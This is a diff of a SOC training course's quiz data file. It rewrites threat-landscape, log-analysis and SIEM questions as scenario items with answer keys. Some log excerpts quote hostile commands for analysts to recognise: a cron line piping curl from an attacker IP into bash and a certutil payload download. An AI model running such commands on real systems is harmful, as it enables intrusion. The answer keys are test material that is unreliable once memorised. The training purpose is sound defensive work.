@@ -216,1376 +216,830 @@ export const quizzes: QuizData[] = [
   {
     quizId: "q2",
     courseId: "soc-fundamentals",
-    title: "Threat Landscape Assessment",
-    description: "Evaluate your knowledge of threat actors, attack vectors, and MITRE ATT&CK.",
+    title: "Threat Landscape & Adversary Analysis",
+    description: "Scenario-driven assessment on attribution, TTPs, MITRE ATT&CK mapping, and threat-actor decision making for Tier 1/2 analysts.",
     passingScore: 75,
     timeLimit: 25,
     questions: [
       {
         id: "q2-1",
-        question: "Which type of threat actor is typically state-sponsored and highly sophisticated?",
+        difficulty: "medium",
+        tags: ["Attribution", "APT", "TTPs"],
+        scenario: "Your CTI team shares the following observations from a recent intrusion at a defense contractor:\n- Initial access: spear-phish (DOCX with macro) to a single engineering lead\n- C2: HTTPS beacon to a Cloudflare-fronted domain, 8h jitter, low-and-slow\n- Tooling: custom .NET loader, Cobalt Strike beacon, Mimikatz variant compiled in 2025\n- Dwell time before exfil: 47 days\n- Targeted data: CAD files and contract bids only",
+        question: "Based on these observations, which actor class is the BEST fit and why?",
         options: [
-          "Script Kiddies",
-          "Hacktivists",
-          "Nation-State Actors (APT)",
-          "Insider Threats"
+          "Script kiddie — Cobalt Strike is freely available and the macro lure is generic",
+          "Hacktivist — defense contractors are common political targets",
+          "Financially motivated cybercrime — Mimikatz indicates credential theft for resale",
+          "Nation-state / APT — patient dwell time, narrow target selection, custom tooling, and intellectual-property focus"
         ],
-        correctAnswer: 2,
-        explanation: "Nation-State Actors (APTs) are state-sponsored, extremely well-resourced, and use highly sophisticated techniques."
+        correctAnswer: 3,
+        explanation: "Long dwell time, surgical targeting (one engineer, one data type), bespoke loader, and theft of competitive IP — not credentials or money — are textbook APT indicators. Cobalt Strike + Mimikatz are commodity tools but the operational discipline (jitter, fronting, narrow scope) shows tradecraft beyond crimeware."
       },
       {
         id: "q2-2",
-        question: "What percentage of successful cyber attacks start with phishing?",
+        difficulty: "medium",
+        tags: ["MITRE ATT&CK", "Mapping"],
+        scenario: "An analyst observes:\n  parent: outlook.exe -> child: winword.exe -> child: powershell.exe -hidden -enc <base64>\nNetwork: powershell.exe -> 185.x.x.x:443 (rare destination)",
+        question: "Which ATT&CK technique chain BEST describes this behavior?",
         options: [
-          "About 25%",
-          "About 50%",
-          "About 75%",
-          "Over 90%"
+          "T1078 Valid Accounts -> T1021 Remote Services -> T1486 Impact",
+          "T1566.001 Spearphishing Attachment -> T1204.002 User Execution -> T1059.001 PowerShell -> T1071.001 Web Protocols C2",
+          "T1190 Exploit Public-Facing Application -> T1505.003 Web Shell",
+          "T1110 Brute Force -> T1003 Credential Dumping"
         ],
-        correctAnswer: 3,
-        explanation: "Over 90% of successful cyber attacks begin with phishing, making it the most common initial access vector."
+        correctAnswer: 1,
+        explanation: "Outlook spawning Word spawning encoded PowerShell that beacons out is the canonical phishing-attachment chain: delivery (T1566.001), user opens it (T1204.002), macro launches PowerShell (T1059.001), and C2 over HTTPS (T1071.001). Mapping observed telemetry to the exact ATT&CK IDs is a core Tier 1/2 skill."
       },
       {
         id: "q2-3",
-        question: "What is the primary motivation of cybercriminal groups?",
+        difficulty: "hard",
+        tags: ["BEC", "Triage"],
+        scenario: "At 09:14, the CFO forwards an email she 'thinks is suspicious.' The message is from cfo@yourcompany.co (note .co) and asks the AP clerk to push a $480k wire to a new vendor before EOD. Mail logs show the message was sent from 198.51.100.22 (Lithuania), SPF=fail, DMARC=quarantine but the gateway delivered it because the AP clerk's mailbox has an allow-list rule for 'cfo@yourcompany.*'.",
+        question: "What is the MOST important immediate action?",
         options: [
-          "Political ideology",
-          "Financial gain",
-          "Recognition and fame",
-          "Environmental activism"
+          "Block the sender IP at the firewall and close the ticket",
+          "Reply-all warning users not to click",
+          "Confirm with AP that no wire has been initiated, then remove the over-broad allow-list rule and recall/quarantine the message tenant-wide",
+          "Submit the domain to VirusTotal and wait for community votes"
         ],
-        correctAnswer: 1,
-        explanation: "Cybercriminals are primarily financially motivated, conducting activities like ransomware attacks, BEC, and credential theft."
+        correctAnswer: 2,
+        explanation: "BEC triage priority: (1) stop financial loss — verify no wire is in-flight, (2) eliminate the control gap that bypassed SPF/DMARC (the wildcard allow-list), (3) purge the message from all mailboxes. Firewall IP blocks are nearly useless for email; the cheap fix is fixing the mail rule and recalling the message."
       },
       {
         id: "q2-4",
-        question: "Which attack involves targeting a third-party vendor to reach the ultimate target?",
+        difficulty: "medium",
+        tags: ["Supply Chain", "Risk"],
+        scenario: "Your vulnerability feed reports that a popular JS package your e-commerce site loads via CDN had a malicious version published last night that exfiltrates form data. Your site pins '^1.2.0' and rebuilds nightly.",
+        question: "Which response is correct AND properly scoped?",
         options: [
-          "Phishing attack",
-          "Brute force attack",
-          "Supply chain attack",
-          "DDoS attack"
+          "No action — CDN providers handle this",
+          "Pin to the last known-good exact version, force-deploy, then review CSP and SRI to detect/prevent loaded-script tampering",
+          "Disable the entire site until the package author replies",
+          "Block the CDN domain at the firewall"
         ],
-        correctAnswer: 2,
-        explanation: "Supply chain attacks target trusted vendors or software providers to compromise their customers (e.g., SolarWinds)."
+        correctAnswer: 1,
+        explanation: "Caret-range pinning (`^1.2.0`) auto-upgrades and is the actual root cause. Pin exact, redeploy, and add Subresource Integrity (SRI) + Content-Security-Policy so a future tampered script can't execute. This is the SolarWinds / event-stream class lesson."
       },
       {
         id: "q2-5",
-        question: "What is 'spear phishing'?",
+        difficulty: "hard",
+        tags: ["Insider Threat", "Behavioral"],
+        scenario: "A senior developer in his notice period:\n- Logged in at 02:30 on a Sunday (first time ever off-hours)\n- Cloned 14 private repos to a personal laptop via GitHub PAT\n- Sent 6 GB to a personal Google Drive 12 minutes later\n- Has legitimate access to every repo touched",
+        question: "How should you classify this and what is the right first action?",
         options: [
-          "Mass email spam",
-          "Targeted phishing at specific individuals",
-          "Phone-based phishing",
-          "USB-based attacks"
+          "False positive — he has access, so it is not a policy violation",
+          "True positive insider data exfiltration — preserve evidence, revoke the PAT and SSO session, engage HR and legal BEFORE confronting the user",
+          "Malware infection — start IR and reimage his laptop",
+          "Benign — wait until Monday and ask him about it"
         ],
         correctAnswer: 1,
-        explanation: "Spear phishing is targeted phishing aimed at specific individuals, using personalized information to appear legitimate."
+        explanation: "Authorized access does not equal authorized use. The off-hours pattern + bulk clone + immediate cloud upload + notice-period context is classic intentional exfiltration. The procedural order matters: evidence first, contain identity, loop HR/legal — never tip off the subject."
       },
       {
         id: "q2-6",
-        question: "What is a 'watering hole' attack?",
+        difficulty: "medium",
+        tags: ["Credential Attacks"],
+        scenario: "Azure AD sign-in logs over 1 hour:\n- 14,200 failed logins\n- Across 9,800 distinct usernames\n- Same 3 passwords tried: 'Winter2026!', 'Company@123', 'Welcome1'\n- Source: 4 residential proxy ASNs",
+        question: "This is BEST described as which attack, and which control most directly mitigates it?",
         options: [
-          "Attacking water treatment facilities",
-          "Compromising websites frequently visited by targets",
-          "Flooding a network with traffic",
-          "Poisoning DNS records"
+          "Brute force on one account — enable account lockout",
+          "Credential stuffing — enable MFA and breach-password screening",
+          "Password spraying — enable MFA, risk-based conditional access, and ban common passwords",
+          "Phishing — deploy email banner warnings"
         ],
-        correctAnswer: 1,
-        explanation: "A watering hole attack compromises websites that the target group frequently visits, infecting visitors with malware."
+        correctAnswer: 2,
+        explanation: "Few passwords across many accounts = spraying (designed to stay below per-account lockout). Stuffing would use leaked username:password pairs (1:1). MFA + conditional access on impossible travel/unfamiliar location + banned-password lists are the mitigations the framework explicitly recommends."
       },
       {
         id: "q2-7",
-        question: "Which type of insider threat is most dangerous due to legitimate access?",
+        difficulty: "hard",
+        tags: ["Pyramid of Pain", "CTI"],
+        scenario: "After containing an intrusion, you have these artifacts:\n  A) MD5 of dropper: 5d41402abc4b2a76b9719d911017c592\n  B) C2 IP: 203.0.113.45\n  C) C2 domain: secure-update[.]net\n  D) Tool: 'Cobalt Strike Malleable C2 profile mimicking Office365 traffic'\n  E) TTP: 'phishing -> macro -> PowerShell -> CS beacon over HTTPS jitter 30%'",
+        question: "Which artifact would cause the MOST 'pain' to the adversary if you block/detect on it, per the Pyramid of Pain?",
         options: [
-          "External hackers",
-          "Malicious insiders with authorized access",
-          "Script kiddies",
-          "Hacktivists"
+          "A — hashes are the foundation of detection",
+          "B — IPs are infrastructure and hard to change",
+          "C — domains require DNS registration",
+          "E — TTPs sit at the top; forcing the adversary to change behavior is far harder than rotating a hash, IP, or domain"
         ],
-        correctAnswer: 1,
-        explanation: "Malicious insiders are dangerous because they have legitimate access, knowledge of systems, and are trusted by security controls."
-      },
-      {
-        id: "q2-8",
-        question: "What does RCE stand for in vulnerability types?",
-        options: [
-          "Remote Control Environment",
-          "Remote Code Execution",
-          "Risk Control Evaluation",
-          "Rapid Containment Effort"
-        ],
-        correctAnswer: 1,
-        explanation: "RCE stands for Remote Code Execution - the most dangerous vulnerability type that allows attackers to run code on remote systems."
-      },
-      {
-        id: "q2-9",
-        question: "What is 'credential stuffing'?",
-        options: [
-          "Creating fake credentials",
-          "Using leaked credentials to exploit password reuse",
-          "Deleting user accounts",
-          "Encrypting credentials"
-        ],
-        correctAnswer: 1,
-        explanation: "Credential stuffing uses leaked username/password pairs from breaches to try logging into other services, exploiting password reuse."
-      },
-      {
-        id: "q2-10",
-        question: "Which threat actor group is typically motivated by ideology and seeks publicity?",
-        options: [
-          "Nation-State Actors",
-          "Cybercriminals",
-          "Hacktivists",
-          "Insider Threats"
-        ],
-        correctAnswer: 2,
-        explanation: "Hacktivists are ideologically motivated and often seek publicity for their causes through attacks like website defacement and data leaks."
-      },
-      {
-        id: "q2-11",
-        question: "What is 'password spraying'?",
-        options: [
-          "Trying all possible password combinations",
-          "Trying a few common passwords against many accounts",
-          "Stealing passwords from memory",
-          "Encrypting passwords"
-        ],
-        correctAnswer: 1,
-        explanation: "Password spraying tries a small number of common passwords against many accounts to avoid lockouts while still finding weak passwords."
-      },
-      {
-        id: "q2-12",
-        question: "What framework maps adversary tactics, techniques, and procedures?",
-        options: [
-          "NIST Framework",
-          "OWASP Top 10",
-          "MITRE ATT&CK",
-          "ISO 27001"
-        ],
-        correctAnswer: 2,
-        explanation: "MITRE ATT&CK is a framework that maps adversary behavior into tactics, techniques, and procedures (TTPs) for threat analysis."
-      },
-      {
-        id: "q2-13",
-        question: "What is 'vishing'?",
-        options: [
-          "Video-based phishing",
-          "Voice/phone-based phishing",
-          "Virtual reality phishing",
-          "Verified phishing"
-        ],
-        correctAnswer: 1,
-        explanation: "Vishing is voice phishing - phone-based social engineering attacks where attackers impersonate legitimate entities."
-      },
-      {
-        id: "q2-14",
-        question: "Which malware type encrypts files and demands payment?",
-        options: [
-          "Trojan",
-          "Worm",
-          "Ransomware",
-          "Rootkit"
-        ],
-        correctAnswer: 2,
-        explanation: "Ransomware encrypts victim files and demands payment (usually cryptocurrency) for the decryption key."
-      },
-      {
-        id: "q2-15",
-        question: "What is a common indicator of a compromised insider?",
-        options: [
-          "Normal working hours",
-          "Accessing only needed resources",
-          "Unusual access patterns and large data downloads",
-          "Regular vacation requests"
-        ],
-        correctAnswer: 2,
-        explanation: "Warning signs of insider threats include unusual access patterns, large data downloads, after-hours activity, and accessing unneeded resources."
-      },
-      {
-        id: "q2-16",
-        question: "What is 'smishing'?",
-        options: [
-          "Social media phishing",
-          "SMS-based phishing",
-          "Smart device phishing",
-          "Smoke and mirrors phishing"
-        ],
-        correctAnswer: 1,
-        explanation: "Smishing is SMS-based phishing - sending malicious text messages to trick users into clicking links or revealing information."
-      },
-      {
-        id: "q2-17",
-        question: "What type of attack floods a target with traffic to make it unavailable?",
-        options: [
-          "Phishing",
-          "SQL Injection",
-          "DDoS",
-          "Man-in-the-middle"
-        ],
-        correctAnswer: 2,
-        explanation: "DDoS (Distributed Denial of Service) attacks flood a target with traffic from multiple sources to overwhelm and disable it."
-      },
-      {
-        id: "q2-18",
-        question: "What is 'typosquatting' in phishing attacks?",
-        options: [
-          "Making typos in emails",
-          "Registering domains similar to legitimate ones (e.g., g00gle.com)",
-          "Typing too fast",
-          "Correcting spelling errors"
-        ],
-        correctAnswer: 1,
-        explanation: "Typosquatting registers domain names similar to legitimate ones (using typos or look-alike characters) to deceive users."
-      },
-      {
-        id: "q2-19",
-        question: "Which APT group is attributed to North Korea?",
-        options: [
-          "APT29 (Cozy Bear)",
-          "APT41",
-          "Lazarus Group",
-          "APT33"
-        ],
-        correctAnswer: 2,
-        explanation: "Lazarus Group is attributed to North Korea and is known for targeting financial institutions and cryptocurrency."
-      },
-      {
-        id: "q2-20",
-        question: "What is 'Business Email Compromise' (BEC)?",
-        options: [
-          "Email server failure",
-          "Fraud using compromised or spoofed business email accounts",
-          "Legitimate business communication",
-          "Email backup process"
-        ],
-        correctAnswer: 1,
-        explanation: "BEC is a sophisticated scam targeting businesses using compromised or spoofed email accounts, often for wire transfer fraud."
+        correctAnswer: 3,
+        explanation: "Bianco's Pyramid of Pain: hashes/IPs/domains are trivial-to-easy to rotate; tools annoying; TTPs are 'tough!' because they force the adversary to rebuild tradecraft. Tier 2/3 detection engineering should prioritize behavioral signatures over IOCs."
       }
     ]
   },
   {
     quizId: "q3",
     courseId: "soc-fundamentals",
-    title: "Log Analysis Challenge",
-    description: "Practical quiz on Windows, Linux, and network log analysis.",
-    passingScore: 70,
+    title: "Log Analysis & Triage Challenge",
+    description: "Hands-on triage using real Windows, Linux, and proxy/firewall log excerpts.",
+    passingScore: 75,
     timeLimit: 30,
     questions: [
       {
         id: "q3-1",
-        question: "Which Windows Event ID indicates a successful logon?",
+        difficulty: "medium",
+        tags: ["Windows", "EventID 4625", "Brute Force"],
+        scenario: "Security.evtx excerpt:\n  04:12:01  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  04:12:03  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  ... (192 entries over 6 minutes, same source, same account)\n  04:18:11  4624  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21",
+        question: "What occurred?",
         options: [
-          "4624",
-          "4625",
-          "4688",
-          "4720"
+          "Service restart loop — benign",
+          "Successful brute force / password guess against the svc_backup service account from an internal host",
+          "Kerberos ticket expiration",
+          "Logon type 3 cannot brute force; ignore"
         ],
-        correctAnswer: 0,
-        explanation: "Event ID 4624 indicates a successful account logon in Windows Security logs."
+        correctAnswer: 1,
+        explanation: "Status 0xC000006A = wrong password. 192 failures from one source against one account followed by a 4624 success is unambiguous credential guessing — and the source is INTERNAL (10.0.5.21), suggesting lateral movement or a compromised host. Service accounts are juicy because they often have stale passwords and broad rights."
       },
       {
         id: "q3-2",
-        question: "Which Windows Event ID indicates a failed logon attempt?",
+        difficulty: "hard",
+        tags: ["Linux", "auth.log", "Persistence"],
+        scenario: "/var/log/auth.log:\n  Mar 14 23:01 sshd[2210]: Accepted publickey for root from 198.51.100.7 port 51220\n  Mar 14 23:01 sudo: root : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/crontab -e\n  Mar 14 23:02 systemd: Started Session 88 of user root.\nAnd `crontab -l` now shows:\n  */5 * * * * curl -s http://198.51.100.7/u | bash",
+        question: "What is the correct classification and immediate containment?",
         options: [
-          "4624",
-          "4625",
-          "4634",
-          "4648"
+          "Routine admin work — root logged in legitimately",
+          "Confirmed compromise + persistence: rogue cron pulling shell from attacker IP. Isolate the host, capture memory, kill cron entry, rotate keys, hunt for the same IP/key elsewhere",
+          "Misconfigured monitoring — silence the alert",
+          "Phishing — notify users"
         ],
         correctAnswer: 1,
-        explanation: "Event ID 4625 indicates a failed logon attempt, useful for detecting brute force attacks."
+        explanation: "Direct root SSH from an external IP + immediate cron persistence beaconing to that same IP is textbook initial-access + T1053.003 (Cron) persistence. Containment must preserve evidence (memory + auth.log + cron) before remediation, and the hunt step (same key / IP across other hosts) is what separates a real responder from someone who just deletes the cron."
       },
       {
         id: "q3-3",
-        question: "What does Windows Event ID 4688 record?",
+        difficulty: "medium",
+        tags: ["Proxy", "Beaconing"],
+        scenario: "Squid access.log — same client, 24h:\n  Requests to https://cdn-metrics[.]xyz/collect: 288\n  Mean interval: 300s, std-dev: 4s\n  Bytes out per request: ~1.2 KB, bytes in: 96 B",
+        question: "What pattern is this and what is the correct next step?",
         options: [
-          "User logon",
-          "Account lockout",
-          "New process creation",
-          "File deletion"
+          "Normal analytics — close ticket",
+          "C2 beaconing (low jitter, periodic, small uplink): pivot on the destination across all endpoints, look up domain age/registration, sandbox the URL, and check the host process making the requests",
+          "DDoS — block at firewall",
+          "Software update check — ignore"
         ],
-        correctAnswer: 2,
-        explanation: "Event ID 4688 records new process creation, essential for tracking executed commands and programs."
+        correctAnswer: 1,
+        explanation: "Tight periodicity (300s ± 4s) with asymmetric small payloads is the signature of automated beaconing, not human or analytics traffic. The pivot pattern (other clients hitting the same destination, domain WHOIS age, process attribution via EDR) is the standard hunt loop."
       },
       {
         id: "q3-4",
-        question: "Which Linux log file contains authentication events?",
+        difficulty: "hard",
+        tags: ["Windows", "Sysmon", "LOLBin"],
+        scenario: "Sysmon Event ID 1:\n  Image: C:\\Windows\\System32\\certutil.exe\n  CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  User: CORP\\jdoe",
+        question: "What is happening?",
         options: [
-          "/var/log/messages",
-          "/var/log/auth.log",
-          "/var/log/apache2/access.log",
-          "/var/log/boot.log"
+          "Routine certificate validation",
+          "Living-off-the-land download (T1105 Ingress Tool Transfer) using certutil as a downloader; high severity — investigate the parent shell origin and quarantine p.exe",
+          "Windows Update activity",
+          "Antivirus signature refresh"
         ],
         correctAnswer: 1,
-        explanation: "The auth.log file (or secure on RHEL/CentOS) contains authentication-related events including SSH logins."
+        explanation: "certutil with -urlcache -split -f is a well-known LOLBin pattern to fetch a remote payload while bypassing some egress monitoring. Map to T1105 + T1218 abuse. Pivot to discover what spawned cmd.exe — that's often the real entry point."
       },
       {
         id: "q3-5",
-        question: "What is syslog used for in Linux systems?",
+        difficulty: "medium",
+        tags: ["Firewall", "Data Exfil"],
+        scenario: "Palo Alto traffic log, single internal workstation, last hour:\n  app=dns  dst=8.8.8.8  bytes_out=412,000,000  sessions=14,902  avg_query_len=180\n  app=web-browsing dst=mixed bytes_out=2,100,000",
+        question: "What is the likely activity?",
         options: [
-          "Compiling code",
-          "Centralized logging and log management",
-          "User interface design",
-          "Network routing"
+          "Heavy web browsing — normal",
+          "DNS tunneling / exfiltration over port 53 (T1071.004 / T1048): unusually large DNS volume with long query names; isolate host and capture pcap",
+          "DNS cache poisoning",
+          "Normal patching activity"
         ],
         correctAnswer: 1,
-        explanation: "Syslog is a standard for computer message logging, providing centralized logging capabilities in Linux/Unix systems."
+        explanation: "412 MB of outbound DNS in an hour with 180-byte average query length is far outside normal. DNS is rarely inspected and frequently allowed outbound — making it the favorite covert channel. The correct response is host isolation + packet capture for forensics, plus a DNS-volume detection going forward."
       },
       {
         id: "q3-6",
-        question: "Which Windows Event ID indicates a user account was created?",
+        difficulty: "hard",
+        tags: ["Correlation"],
+        scenario: "Three alerts within 14 minutes from the SAME endpoint (HOST-44):\n  A) EDR: suspicious WMI subscription created\n  B) AD: HOST-44$ enumerated all Domain Admins via LDAP\n  C) Firewall: SMB (445/tcp) to 23 other internal hosts that HOST-44 has never talked to before",
+        question: "What is the BEST interpretation?",
         options: [
-          "4720",
-          "4624",
-          "4688",
-          "4634"
-        ],
-        correctAnswer: 0,
-        explanation: "Event ID 4720 indicates a new user account was created, important for detecting unauthorized account creation."
-      },
-      {
-        id: "q3-7",
-        question: "What type of information do firewall logs typically contain?",
-        options: [
-          "User passwords",
-          "Source/destination IPs and allow/deny decisions",
-          "Application source code",
-          "Employee schedules"
+          "Three unrelated low-severity events",
+          "Active intrusion with WMI persistence (T1546.003) + discovery (T1087.002) + lateral movement (T1021.002). Escalate to IR immediately and isolate HOST-44",
+          "Vulnerability scanner activity",
+          "Sysadmin doing inventory"
         ],
         correctAnswer: 1,
-        explanation: "Firewall logs record network traffic decisions including source/destination IPs, ports, and allow/deny actions."
-      },
-      {
-        id: "q3-8",
-        question: "What does 'Logon Type 10' indicate in Windows Event 4624?",
-        options: [
-          "Local console logon",
-          "Network logon",
-          "Remote Desktop (RDP) logon",
-          "Service account logon"
-        ],
-        correctAnswer: 2,
-        explanation: "Logon Type 10 indicates a Remote Desktop (RDP) session, which could indicate lateral movement if unexpected."
-      },
-      {
-        id: "q3-9",
-        question: "Which Linux log would you check for cron job execution?",
-        options: [
-          "/var/log/auth.log",
-          "/var/log/cron or /var/log/syslog",
-          "/var/log/apache2/error.log",
-          "/var/log/boot.log"
-        ],
-        correctAnswer: 1,
-        explanation: "Cron job execution is logged in /var/log/cron (RHEL) or /var/log/syslog (Debian/Ubuntu)."
-      },
-      {
-        id: "q3-10",
-        question: "What information can DNS logs reveal about potential threats?",
-        options: [
-          "Only legitimate website visits",
-          "Command and control (C2) communication and DGA domains",
-          "User passwords",
-          "Hardware specifications"
-        ],
-        correctAnswer: 1,
-        explanation: "DNS logs can reveal C2 communications, domain generation algorithm (DGA) activity, and data exfiltration via DNS tunneling."
-      },
-      {
-        id: "q3-11",
-        question: "Which Windows Event ID indicates a member was added to a security-enabled global group?",
-        options: [
-          "4624",
-          "4732",
-          "4688",
-          "4625"
-        ],
-        correctAnswer: 1,
-        explanation: "Event ID 4732 indicates a member was added to a security-enabled local group, important for privilege escalation detection."
-      },
-      {
-        id: "q3-12",
-        question: "What is the significance of 'Logon Type 3' in Windows logs?",
-        options: [
-          "Interactive local logon",
-          "Network logon (accessing shared resources)",
-          "Batch job logon",
-          "Remote desktop logon"
-        ],
-        correctAnswer: 1,
-        explanation: "Logon Type 3 indicates a network logon, commonly seen when accessing network shares or resources."
-      },
-      {
-        id: "q3-13",
-        question: "What would multiple 4625 events from the same source IP indicate?",
-        options: [
-          "Normal user activity",
-          "Successful authentication",
-          "Potential brute force attack",
-          "System maintenance"
-        ],
-        correctAnswer: 2,
-        explanation: "Multiple failed logon attempts (4625) from the same source IP is a strong indicator of a brute force attack."
-      },
-      {
-        id: "q3-14",
-        question: "Which proxy log field is most useful for identifying malicious downloads?",
-        options: [
-          "Source IP only",
-          "URL and content type",
-          "User agent only",
-          "Timestamp only"
-        ],
-        correctAnswer: 1,
-        explanation: "URL and content type fields help identify malicious downloads by revealing the actual resources accessed and their file types."
-      },
-      {
-        id: "q3-15",
-        question: "What Linux command shows the last logged-in users?",
-        options: [
-          "ls -la",
-          "last",
-          "top",
-          "grep"
-        ],
-        correctAnswer: 1,
-        explanation: "The 'last' command shows a list of last logged-in users by reading /var/log/wtmp."
+        explanation: "Individually these are 'meh.' Correlated they form Persistence -> Discovery -> Lateral Movement on the kill chain — the unmistakable middle game of a real intrusion. SOC value lives in correlation, not single-alert handling."
       }
     ]
   },
   {
     quizId: "q4",
     courseId: "soc-fundamentals",
-    title: "SIEM & Alert Triage Quiz",
-    description: "Test your knowledge of SIEM operations, search queries, and alert triage processes.",
-    passingScore: 70,
-    timeLimit: 20,
+    title: "SIEM & Alert Triage in Practice",
+    description: "Scenario quiz on writing, tuning, and triaging SIEM detections.",
+    passingScore: 75,
+    timeLimit: 25,
     questions: [
       {
         id: "q4-1",
-        question: "What is the primary purpose of a SIEM?",
+        difficulty: "medium",
+        tags: ["Tuning", "False Positives"],
+        scenario: "Detection 'Mass File Access' fires 480 times/day. Review shows 96% come from three backup service accounts running nightly snapshots and the SCCM scanner.",
+        question: "What is the correct tuning approach?",
         options: [
-          "To replace antivirus software",
-          "To aggregate logs and provide centralized security monitoring",
-          "To block network traffic",
-          "To manage employee passwords"
+          "Disable the rule",
+          "Raise severity so analysts pay attention",
+          "Add a precise allow-list (the named service accounts + scheduled time window) and keep the rule active for everyone else; document the suppression with an expiry/review date",
+          "Mute the user mailbox of whoever complained"
         ],
-        correctAnswer: 1,
-        explanation: "SIEM aggregates logs from multiple sources, correlates events, and provides centralized security monitoring and alerting."
+        correctAnswer: 2,
+        explanation: "Good tuning suppresses *only* the known-benign context (named accounts + time window), not the entire rule. Always document suppressions with an owner and review date so they don't become permanent blind spots."
       },
       {
         id: "q4-2",
-        question: "What is a correlation rule in SIEM?",
+        difficulty: "hard",
+        tags: ["Splunk", "SPL"],
+        scenario: "You need to detect users authenticating from two different countries within 1 hour ('impossible travel').",
+        question: "Which Splunk approach is MOST correct?",
         options: [
-          "A rule that deletes old logs",
-          "Logic that identifies patterns across multiple events to detect threats",
-          "A rule for password complexity",
-          "A backup procedure"
+          "`index=auth | stats count by user` and review manually",
+          "`index=auth action=success | iplocation src_ip | stats dc(Country) as countries values(Country) as c values(src_ip) as ips by user _time | where countries>1`",
+          "`index=auth | bin _time span=1h | iplocation src_ip | stats dc(Country) as countries by user, _time | where countries>1`",
+          "`index=auth | head 100`"
         ],
-        correctAnswer: 1,
-        explanation: "Correlation rules analyze multiple events together to identify attack patterns that single events wouldn't reveal."
+        correctAnswer: 2,
+        explanation: "Option C buckets time into 1h windows BEFORE counting distinct countries per user — the correct semantic for 'within 1 hour.' Option B without a time bucket lumps the whole search range and produces noisy true-but-useless positives. Detection engineering requires the query to match the English."
       },
       {
         id: "q4-3",
-        question: "What is the first step in the alert triage process?",
+        difficulty: "medium",
+        tags: ["Triage", "Severity"],
+        scenario: "Three alerts hit your queue simultaneously at 14:00:\n  1) IDS: Nmap SYN scan from 192.0.2.10 -> 10.0.0.0/24\n  2) EDR: ransomware behavioral block on FIN-DB-01 (production financial DB)\n  3) DLP: 1 customer record copied to USB on HR laptop",
+        question: "Correct triage order?",
         options: [
-          "Immediately escalate to management",
-          "Delete the alert",
-          "Understand what triggered the alert",
-          "Reset user passwords"
+          "1, 2, 3 — chronological",
+          "2, 3, 1 — by impact: production DB ransomware first, DLP next, recon last",
+          "3, 1, 2 — alphabetical",
+          "Work whichever has fewest fields to read"
         ],
-        correctAnswer: 2,
-        explanation: "The first step is to understand what triggered the alert by reading the alert details, checking the detection rule, and gathering initial context."
+        correctAnswer: 1,
+        explanation: "Ordering by business impact (and reversibility) is the analyst's primary triage skill. Active ransomware on a financial system is potentially catastrophic and time-critical; recon is informational and can wait. Severity in the queue rarely matches reality — analyst judgement does."
       },
       {
         id: "q4-4",
-        question: "What does a 'false positive' mean in alert triage?",
+        difficulty: "hard",
+        tags: ["Detection Engineering"],
+        scenario: "A new detection 'Encoded PowerShell' fires on:\n  powershell.exe -enc <base64>\nAfter 2 weeks: 1,400 fires, 1,392 from a legitimate SCCM client-action script.",
+        question: "What is the BEST evolution of the rule (not just a suppression)?",
         options: [
-          "A missed attack",
-          "An alert triggered by benign activity",
-          "A confirmed security incident",
-          "A system malfunction"
+          "Delete it; too noisy",
+          "Refine to fire only when the encoded payload decodes to known-suspicious indicators (DownloadString, IEX, Invoke-WebRequest, FromBase64String chained) AND the parent is NOT the known SCCM agent; keep the SCCM hash on an allow-list with review",
+          "Lower the severity to informational and ignore",
+          "Move it to a different SIEM"
         ],
         correctAnswer: 1,
-        explanation: "A false positive is an alert that fired on benign activity - it looks suspicious but is actually legitimate behavior."
+        explanation: "Detection engineering > alert handling. The strongest detections combine a behavioral signal (suspicious decoded content), a context filter (parent process), and a maintainable allow-list. Deleting noisy rules surrenders coverage; suppressing them blindly creates blind spots."
       },
       {
         id: "q4-5",
-        question: "What should you do after determining an alert is a true positive?",
+        difficulty: "medium",
+        tags: ["Metrics", "SLA"],
+        scenario: "Quarterly metrics:\n  MTTD: 14 min  MTTA: 47 min  MTTR: 2 h 30 min\n  Analyst headcount: unchanged.  Alert volume: +60%.",
+        question: "Which metric points to the most actionable problem?",
         options: [
-          "Close the ticket immediately",
-          "Document findings and initiate response/escalation",
-          "Delete the logs",
-          "Ignore it until the next shift"
+          "MTTD — detections are slow",
+          "MTTA — alerts are sitting in the queue 47 minutes before anyone touches them; symptom of capacity vs. volume mismatch. Address with tuning, automation, or staffing",
+          "MTTR — incidents take too long to close",
+          "Headcount is irrelevant"
         ],
         correctAnswer: 1,
-        explanation: "After confirming a true positive, document your findings thoroughly and initiate the appropriate response or escalation."
+        explanation: "MTTD is healthy (detections fire quickly). MTTA being the long pole means alerts are queueing — the lever is reducing volume (tuning), increasing throughput (SOAR/automation), or adding analysts. Knowing which metric to act on is more valuable than memorizing definitions."
       },
       {
         id: "q4-6",
-        question: "Which SIEM search operator is used to filter results?",
+        difficulty: "hard",
+        tags: ["Use Case Lifecycle"],
+        scenario: "Your SOC manager asks you to propose a NEW detection use case for 'OAuth consent phishing in M365.'",
+        question: "Which response best follows the use-case lifecycle?",
         options: [
-          "DELETE",
-          "WHERE or search filters",
-          "BACKUP",
-          "RESTART"
+          "Write a rule that fires on every OAuth grant",
+          "1) Hypothesis (illicit consent grants to risky apps), 2) Data source check (AAD AuditLogs: 'Consent to application'), 3) Logic (publisher unverified OR risky scopes like Mail.ReadWrite by non-admin), 4) Validation in dev, 5) Tuning baseline, 6) Runbook + handoff to ops",
+          "Ask the vendor to build it",
+          "Block all OAuth apps"
         ],
         correctAnswer: 1,
-        explanation: "WHERE clauses and search filters are used to narrow down results to specific criteria in SIEM queries."
-      },
-      {
-        id: "q4-7",
-        question: "What is 'enrichment' in the context of alert triage?",
-        options: [
-          "Deleting unnecessary data",
-          "Adding context and intelligence to alerts for better decision-making",
-          "Compressing log files",
-          "Creating backup copies"
-        ],
-        correctAnswer: 1,
-        explanation: "Enrichment adds context like threat intelligence, asset information, and user details to help analysts make better decisions."
-      },
-      {
-        id: "q4-8",
-        question: "When should you immediately escalate an alert?",
-        options: [
-          "For every alert received",
-          "Only on Mondays",
-          "When you detect active malware, ransomware, or data exfiltration",
-          "Never - handle everything yourself"
-        ],
